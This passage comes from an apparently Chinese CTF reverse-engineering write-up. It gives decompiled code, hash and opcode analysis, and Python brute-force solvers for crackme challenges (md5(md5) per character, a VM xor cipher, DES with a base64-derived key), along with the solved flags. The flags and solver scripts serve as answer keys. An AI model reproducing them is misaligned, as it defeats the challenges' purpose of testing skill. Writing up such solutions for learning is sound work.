class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">000000000040E0</span>A0globalBig_Numbers1_40E0A0$c0b<span class="number">&#x27;14</span>d89c38cd0fb23a14be2798d449c182<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E0</span>C1globalBig_Numbers1_40E0C1$c0b<span class="number">&#x27;</span>a94837b18f8f43f29448b40a6e7386ba<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E0</span>E2globalBig_Numbers1_40E0E2$c0b<span class="number">&#x27;</span>af85d512594fc84a5c65ec9970956ea5<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E103</span>globalBig_Numbers1_40E103$c0b<span class="number">&#x27;</span>af85d512594fc84a5c65ec9970956ea5<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E124</span>globalBig_Numbers1_40E124$c0b<span class="number">&#x27;10e21</span>da237a4a1491e769df6f4c3b419<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E145</span>globalBig_Numbers1_40E145$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E166</span>globalBig_Numbers1_40E166$c0b<span class="number">&#x27;297e7</span>ca127d2eef674c119331fe30dff<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E187</span>globalBig_Numbers1_40E187$c0b<span class="number">&#x27;b</span>5d2099e49bdb07b8176dff5e23b3c14<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E1</span>A8globalBig_Numbers1_40E1A8$c0b<span class="number">&#x27;83b</span>e264eb452fcf0a1c322f2c7cbf987<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E1</span>C9globalBig_Numbers1_40E1C9$c0b<span class="number">&#x27;</span>a94837b18f8f43f29448b40a6e7386ba<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E1</span>EAglobalBig_Numbers1_40E1EA$c0b<span class="number">&#x27;71b</span>0438bf46aa26928c7f5a371d619e1<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E20</span>BglobalBig_Numbers1_40E20B$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E22</span>CglobalBig_Numbers1_40E22C$c0b<span class="number">&#x27;</span>ac49073a7165f41c57eb2c1806a7092e<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E24</span>DglobalBig_Numbers1_40E24D$c0b<span class="number">&#x27;</span>a94837b18f8f43f29448b40a6e7386ba<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E26</span>EglobalBig_Numbers1_40E26E$c0b<span class="number">&#x27;</span>af85d512594fc84a5c65ec9970956ea5<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E28</span>FglobalBig_Numbers1_40E28F$c0b<span class="number">&#x27;</span>ed108f6919ebadc8e809f8b86ef40b05<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E2</span>B0globalBig_Numbers1_40E2B0$c0b<span class="number">&#x27;10e21</span>da237a4a1491e769df6f4c3b419<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E2</span>D1globalBig_Numbers1_40E2D1$c0b<span class="number">&#x27;3</span>cfd436919bc3107d68b912ee647f341<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E2</span>F2globalBig_Numbers1_40E2F2$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E313</span>globalBig_Numbers1_40E313$c0b<span class="number">&#x27;65</span>c162f7c43612ba1bdf4d0f2912bbc0<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E334</span>globalBig_Numbers1_40E334$c0b<span class="number">&#x27;10e21</span>da237a4a1491e769df6f4c3b419<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E355</span>globalBig_Numbers1_40E355$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E376</span>globalBig_Numbers1_40E376$c0b<span class="number">&#x27;3</span>cfd436919bc3107d68b912ee647f341<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E397</span>globalBig_Numbers1_40E397$c0b<span class="number">&#x27;557460</span>d317ae874c924e9be336a83cbe<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E3</span>B8globalBig_Numbers1_40E3B8$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E3</span>D9globalBig_Numbers1_40E3D9$c0b<span class="number">&#x27;9203</span>d8a26e241e63e4b35b3527440998<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E3</span>FAglobalBig_Numbers1_40E3FA$c0b<span class="number">&#x27;10e21</span>da237a4a1491e769df6f4c3b419<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E41</span>BglobalBig_Numbers1_40E41B$c0b<span class="number">&#x27;f</span>91b2663febba8a884487f7de5e1d249<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E43</span>CglobalBig_Numbers1_40E43C$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E45</span>DglobalBig_Numbers1_40E45D$c0b<span class="number">&#x27;</span>d7afde3e7059cd0a0fe09eec4b0008cd<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E47</span>EglobalBig_Numbers1_40E47E$c0b<span class="number">&#x27;488</span>c428cd4a8d916deee7c1613c8b2fd<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E49</span>FglobalBig_Numbers1_40E49F$c0b<span class="number">&#x27;39</span>abe4bca904bca5a11121955a2996bf<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E4</span>C0globalBig_Numbers1_40E4C0$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E4</span>E1globalBig_Numbers1_40E4E1$c0b<span class="number">&#x27;3</span>cfd436919bc3107d68b912ee647f341<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E502</span>globalBig_Numbers1_40E502$c0b<span class="number">&#x27;39</span>abe4bca904bca5a11121955a2996bf<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E523</span>globalBig_Numbers1_40E523$c0b<span class="number">&#x27;4e44</span>f1ac85cd60e3caa56bfd4afb675e<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E544</span>globalBig_Numbers1_40E544$c0b<span class="number">&#x27;45</span>cf8ddfae1d78741d8f1c622689e4af<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E565</span>globalBig_Numbers1_40E565$c0b<span class="number">&#x27;3</span>cfd436919bc3107d68b912ee647f341<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E586</span>globalBig_Numbers1_40E586$c0b<span class="number">&#x27;39</span>abe4bca904bca5a11121955a2996bf<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E5</span>A7globalBig_Numbers1_40E5A7$c0b<span class="number">&#x27;4e44</span>f1ac85cd60e3caa56bfd4afb675e<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E5</span>C8globalBig_Numbers1_40E5C8$c0b<span class="number">&#x27;37327b</span>b06c83cb29cefde1963ea588aa<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E5</span>E9globalBig_Numbers1_40E5E9$c0b<span class="number">&#x27;</span>a705e8280082f93f07e3486636f3827a<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E60</span>AglobalBig_Numbers1_40E60A$c0b<span class="number">&#x27;23e65</span>a679105b85c5dc7034fded4fb5f<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E62</span>BglobalBig_Numbers1_40E62B$c0b<span class="number">&#x27;10e21</span>da237a4a1491e769df6f4c3b419<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E64</span>CglobalBig_Numbers1_40E64C$c0b<span class="number">&#x27;71b</span>0438bf46aa26928c7f5a371d619e1<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E66</span>DglobalBig_Numbers1_40E66D$c0b<span class="number">&#x27;</span>af85d512594fc84a5c65ec9970956ea5<span class="number">&#x27;</span></span><br><span class="line">.data:<span class="number">000000000040E68</span>EglobalBig_Numbers1_40E68E$c0b<span class="number">&#x27;39</span>abe4bca904bca5a11121955a2996bf<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure><p>找个md5网站解一解 发现是这种形式 md5(md5($pass))<br>所以这是对单字符做了两遍md5的结果<br>那么拿到最后数据 爆破一下即可<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s = s.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">s = s[:-<span class="number">1</span>]</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    enc.append(c[-<span class="number">33</span>:-<span class="number">1</span>])</span><br><span class="line">enc = enc[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> target <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="comment"># print(target)</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        _<span class="built_in">hash</span> = md5(<span class="built_in">str</span>(<span class="built_in">chr</span>(x)).encode()).hexdigest()</span><br><span class="line">        ss = _<span class="built_in">hash</span></span><br><span class="line">        _<span class="built_in">hash</span> = md5(<span class="built_in">str</span>(ss).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span>(_<span class="built_in">hash</span> == target):</span><br><span class="line">            flag += <span class="built_in">chr</span>(x)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Hello_Ctfer_Velcom_To_my_Mov_and_md5(md5)_world</span></span><br></pre></td></tr></table></figure><hr><hr><p>以上是做题的一些trick 其实还是想了解一下这题完整的逻辑<br>由于函数不多 挨个翻<br>在 sub_404CB0 看到是md5加密算法(不可能魔改md5吧…)<br>交叉引用查看哪里调用了md5<br>在 sub_404140 找到了唯三调用的点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">v14 = *v51 + <span class="number">24</span>;</span><br><span class="line">v33 = *v51 + <span class="number">8</span>;</span><br><span class="line">v32 = v14;</span><br><span class="line"><span class="built_in">sub_404CB0</span>(v33, v14);</span><br><span class="line">*v48 = *(_DWORD *)v46;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v31 = *v48;</span><br><span class="line">  v30 = v31 + <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v31 + <span class="number">64</span>) &gt; *(_DWORD *)v49 )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v28 = *v51 + <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_40FA30 &lt; <span class="number">10</span> &amp;&amp; dword_40FA30 &gt;= <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_404CB0</span>(v28, (<span class="type">char</span> *)*v50 + (<span class="type">unsigned</span> <span class="type">int</span>)*v48);</span><br><span class="line">    <span class="keyword">if</span> ( dword_40FA30 &gt;= <span class="number">10</span> || dword_40FA30 &lt; <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_404CB0</span>(v28, (<span class="type">char</span> *)*v50 + (<span class="type">unsigned</span> <span class="type">int</span>)*v48);</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = *v48;</span><br><span class="line">  v26 = v27 + <span class="number">64</span>;</span><br></pre></td></tr></table></figure><p>由于第二个第三个在一个虚假的do-while里 实则只执行了第二个md5 加上前面的md5 有效的md5调用了两次<br>同时通过 v28-&gt;v51-&gt;v14&#x2F;v33 也能发现这两次md5有关联 那么合理推测md5(md5(xxx))就很自然了<br>由于这题控制流不是那么平坦 平坦化后看逻辑还好 但是动调跳来跳去挺烦的 所以动调就免了(以后有时间再来试试)</p><h2 id="vm-wo"><a href="#vm-wo" class="headerlink" title="vm_wo"></a>vm_wo</h2><p>macos的ARM指令集… 因为没有mac动调不了一点…<br>题目逻辑简单<br>输入长度为29的flag后进行虚拟机操作加密 然后与一直enc比对<br>虚拟机前的opcode准备部分:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8[<span class="number">0</span>] = <span class="number">0x20D01011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v8 + <span class="number">7</span>) = <span class="number">0x300010201180702</span>LL;</span><br><span class="line">      BYTE2(v8[<span class="number">0</span>]) = *a1;</span><br><span class="line">      interpretBytecode((__int64)v8, <span class="number">15</span>);</span><br><span class="line">      v7[<span class="number">0</span>] = <span class="number">0x20D02011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v7 + <span class="number">7</span>) = <span class="number">0x400010201180602</span>LL;</span><br><span class="line">      BYTE2(v7[<span class="number">0</span>]) = vm_body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode((__int64)v7, <span class="number">15</span>);</span><br><span class="line">      v6[<span class="number">0</span>] = <span class="number">0x20D03011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v6 + <span class="number">7</span>) = <span class="number">0x500010201180502</span>LL;</span><br><span class="line">      BYTE2(v6[<span class="number">0</span>]) = vm_body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode((__int64)v6, <span class="number">15</span>);</span><br><span class="line">      v5[<span class="number">0</span>] = <span class="number">0x20D04011903001A</span>LL;</span><br><span class="line">      *(_QWORD *)((<span class="type">char</span> *)v5 + <span class="number">7</span>) = <span class="number">0x600010201180402</span>LL;</span><br><span class="line">      BYTE2(v5[<span class="number">0</span>]) = vm_body[<span class="number">0</span>];</span><br><span class="line">      interpretBytecode((__int64)v5, <span class="number">15</span>);</span><br><span class="line">      *a1++ = ((<span class="type">unsigned</span> __int8)vm_body[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * vm_body[<span class="number">0</span>]);</span><br><span class="line">      --v2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最开始就是这里没有理解准确<br>以v7[0]为例</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v7[0] = 0x20D02011903001ALL; -&gt; 低8个字节 020D02011903001A</span><br><span class="line"><span class="emphasis">*(_QWORD *</span>)((char <span class="emphasis">*)v7 + 7) = 0x400010201180602LL;</span></span><br><span class="line"><span class="emphasis">注意到这里是+7 所以会覆盖掉v7[0]的最高字节</span></span><br><span class="line"><span class="emphasis">-&gt;400010201180602 020D02011903001A -&gt; 04000102011806020D02011903001A</span></span><br><span class="line"><span class="emphasis">刚好15字节</span></span><br></pre></td></tr></table></figure><p>这就是静态分析容易出错的点… 如果能动调的话就特别简单…<br>然后找对应的opcode(hex)<br>发现就是一个循环移位+异或的加密逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0 mov vm_body[0] 3</span><br><span class="line">3 mov vm_body[1] vm_body[0]&gt;&gt;1</span><br><span class="line">6 mov vm_body[2] vm_body[0]&lt;&lt;7</span><br><span class="line">9 mov vm_body[0] vm_body[1]|vm_body[2]</span><br><span class="line">12 xor vm_body[0] vm_body[3]</span><br><span class="line">15 mov vm_body[0] 3</span><br><span class="line">18 mov vm_body[1] vm_body[0]&gt;&gt;2</span><br><span class="line">21 mov vm_body[2] vm_body[0]&lt;&lt;6</span><br><span class="line">24 mov vm_body[0] vm_body[1]|vm_body[2]</span><br><span class="line">27 xor vm_body[0] vm_body[4]</span><br><span class="line">30 mov vm_body[0] 3</span><br><span class="line">33 mov vm_body[1] vm_body[0]&gt;&gt;3</span><br><span class="line">36 mov vm_body[2] vm_body[0]&lt;&lt;5</span><br><span class="line">39 mov vm_body[0] vm_body[1]|vm_body[2]</span><br><span class="line">42 xor vm_body[0] vm_body[5]</span><br><span class="line">45 mov vm_body[0] 3</span><br><span class="line">48 mov vm_body[1] vm_body[0]&gt;&gt;4</span><br><span class="line">51 mov vm_body[2] vm_body[0]&lt;&lt;4</span><br><span class="line">54 mov vm_body[0] vm_body[1]|vm_body[2]</span><br><span class="line">57 xor vm_body[0] vm_body[6]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意下vm_body[3]处是dword的赋值 刚好对应BYTE的[3],[4],[5],[6]<br>正向爆破即可</p><p><strong>DASCTF{you_are_right_so_cool}</strong></p><h2 id="EZ加密器"><a href="#EZ加密器" class="headerlink" title="EZ加密器"></a>EZ加密器</h2><p>学习到了IDA7.5 Signsrch插件的使用<br>做的时候犯了一个错误 题目对输入的vericode没有做正确性的检查！！！<br>只检查了长度… 只要是6位都会继续… 所以后面需要爆破<br>大致流程:<br>先输入6位数字 然后base64变表加密得到新的key<br>再对input做加密 最后HEX拼接与已知比较<br>比较的密文在加密input的时候做了xor7的修改</p><p>关键部分的加密大致可以知道是有sbox的流加密<br>用IDA插件 Sighsrch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rdata:01400160800040DES_fp [..64]</span><br><span class="line">.rdata:01400160C00030DES permuted choice key (table) [..48]</span><br><span class="line">.rdata:01400161000038DES permuted choice table (key) [..56]</span><br><span class="line">.rdata:01400161600020DES_p32i [..32]</span><br><span class="line">.rdata:01400161800200DES S-boxes [..512]</span><br><span class="line">.rdata:01400163800030DES_ei [..48]</span><br><span class="line">.rdata:01400163C00040DES initial permutation IP [..64]</span><br></pre></td></tr></table></figure><p>知道是DES 那么枚举输入数字爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">s2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">100000</span>,<span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i).zfill(<span class="number">6</span>)</span><br><span class="line">    key = b64encode((s.encode())).decode().translate(<span class="built_in">str</span>.maketrans(s1,s2)).encode()</span><br><span class="line">    des = DES.new(key,DES.MODE_ECB)</span><br><span class="line">    pt = des.decrypt(cipher)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#x27;</span> <span class="keyword">in</span> pt:</span><br><span class="line">        <span class="built_in">print</span>(pt)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong>DASCTF{f771b96b71514bb6bc20f3275fa9404e}</strong></p><h1 id="V-N2020公开赛"><a href="#V-N2020公开赛" class="headerlink" title="V&amp;N2020公开赛"></a>V&amp;N2020公开赛</h1><h2 id="strangeCPP"><a href="#strangeCPP" class="headerlink" title="strangeCPP"></a>strangeCPP</h2><p>这几天做reversing.Kr被干碎了…</p><p>运行一下 发现电脑的很多信息都被他打印出来了(学习一手)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_SYSTEM_INFO</span> SystemInfo; <span class="comment">// [rsp+28h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **j; <span class="comment">// [rsp+78h] [rbp+58h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// [rsp+98h] [rbp+78h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v10;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">94</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;unk_7FF7D1F77033);</span><br><span class="line">  <span class="built_in">GetSystemInfo</span>(&amp;SystemInfo);</span><br><span class="line">  <span class="built_in">putchar</span>(byte_7FF7D1F71004);</span><br><span class="line">  <span class="built_in">putchar</span>(byte_7FF7D1F71005);</span><br><span class="line">  <span class="built_in">putchar</span>(byte_7FF7D1F71006);</span><br><span class="line">  <span class="built_in">putchar</span>(byte_7FF7D1F71007);</span><br><span class="line">  <span class="built_in">putchar</span>(byte_7FF7D1F71019);</span><br><span class="line">  <span class="built_in">putchar</span>(byte_7FF7D1F7101A);</span><br><span class="line">  <span class="built_in">putchar</span>(byte_7FF7D1F71005);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let me have a look at your computer...&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = envp; *j; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = *j;</span><br><span class="line">    <span class="built_in">sub_7FF7D1F61226</span>(<span class="string">&quot;%s\n&quot;</span>, v13);</span><br><span class="line">  &#125;</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(std::cout, sub_7FF7D1F61127);</span><br><span class="line">  CPU_NUMBER = SystemInfo.dwNumberOfProcessors;</span><br><span class="line">  <span class="built_in">sub_7FF7D1F61226</span>(<span class="string">&quot;now system cpu num is %d\n&quot;</span>, SystemInfo.dwNumberOfProcessors);</span><br><span class="line">  <span class="keyword">if</span> ( CPU_NUMBER &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Are you in VM?&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">GetUserNameA</span>(Str1, &amp;pcbBuffer) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">sub_7FF7D1F61172</span>(std::cout, <span class="string">&quot;this is useful&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, sub_7FF7D1F61127);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(std::cout, sub_7FF7D1F61127);</span><br><span class="line">  v7 